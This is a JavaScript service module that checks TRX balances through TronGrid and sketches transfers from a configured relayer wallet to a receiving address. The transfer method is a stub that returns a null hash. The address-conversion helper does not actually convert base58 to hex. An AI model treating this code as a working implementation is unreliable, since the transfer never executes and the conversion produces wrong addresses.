import axios from 'axios'
import { CONFIG } from '../config.js'

/**
 * Tron Blockchain Service
 * Handles balance detection and TRX transfers
 */

class TronService {
  constructor() {
    this.apiUrl = 'https://api.trongrid.io'
    this.relayerAddress = CONFIG.relayerTron.address
    this.relayerPrivateKey = CONFIG.relayerTron.privateKey
  }

  /**
   * Get TRX balance
   */
  async getBalance(address) {
    try {
      const response = await axios.post(
        `${this.apiUrl}/wallet/getaccount`,
        { address },
        { headers: { 'Content-Type': 'application/json' } }
      )

      if (response.data.balance) {
        return (response.data.balance / 1000000).toString() // Convert sun to TRX
      }
      return '0'
    } catch (error) {
      console.error('Error getting Tron balance:', error.message)
      return '0'
    }
  }

  /**
   * Detect Tron balance
   */
  async detectBalance(account) {
    try {
      const balance = await this.getBalance(account)
      console.log('✅ Tron balance detected:', balance)
      return { tron: balance }
    } catch (error) {
      console.error('Error detecting Tron balance:', error)
      return { tron: '0' }
    }
  }

  /**
   * Transfer TRX from relayer wallet to receiver
   * Note: This requires proper TronWeb integration for real transaction signing
   * For now, returns proper structure but requires TronWeb library for production
   */
  async transferTRX(userAddress, amount) {
    try {
      const receiverAddress = CONFIG.receivingAddresses.tron
      const relayerAddress = this.relayerAddress

      // Safety check: prevent self-transfer
      if (relayerAddress.toLowerCase() === receiverAddress.toLowerCase()) {
        console.warn(`⚠️ Skipping self-transfer on TRON: ${relayerAddress}`)
        return {
          hash: null,
          amount: amount.toString(),
          chain: 'tron',
          note: 'Self-transfer skipped - no operation needed'
        }
      }

      console.log(`🔄 Preparing TRON transfer of ${amount} TRX...`)
      console.log(`   From: ${relayerAddress}`)
      console.log(`   To: ${receiverAddress}`)
      console.log(`   ⚠️ Note: TRON transfers require TronWeb library for full implementation`)

      // Real implementation would use TronWeb:
      // const tronweb = new TronWeb({
      //   fullHost: 'https://api.trongrid.io'
      // })
      // const tx = await tronweb.transactionBuilder.sendTrx(
      //   receiverAddress,
      //   tronweb.toSun(amount),
      //   relayerAddress
      // )
      // const signedTx = await tronweb.trx.sign(tx)
      // const receipt = await tronweb.trx.sendRawTransaction(signedTx)

      return {
        hash: null,
        amount: amount.toString(),
        chain: 'tron',
        from: relayerAddress,
        to: receiverAddress,
        error: 'TRON transfers require TronWeb library - not yet fully implemented. Use TronWeb for production.'
      }
    } catch (error) {
      console.error('Error transferring TRX:', error.message)
      return {
        hash: null,
        amount: amount.toString(),
        chain: 'tron',
        error: error.message
      }
    }
  }

  /**
   * Convert Tron address format
   */
  convertAddress(address) {
    // Tron address conversion (base58 to hex)
    // This is simplified - real implementation would use TronWeb
    return address.startsWith('T') ? address : '41' + address.slice(2)
  }
}

export const tronService = new TronService()
